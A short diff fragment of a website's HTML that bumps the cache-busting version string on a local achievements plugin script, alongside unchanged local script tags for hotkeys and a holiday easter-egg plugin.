   const applyTheme = (theme) => {
@@ -1012,7 +1012,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8lt"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbj9i"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
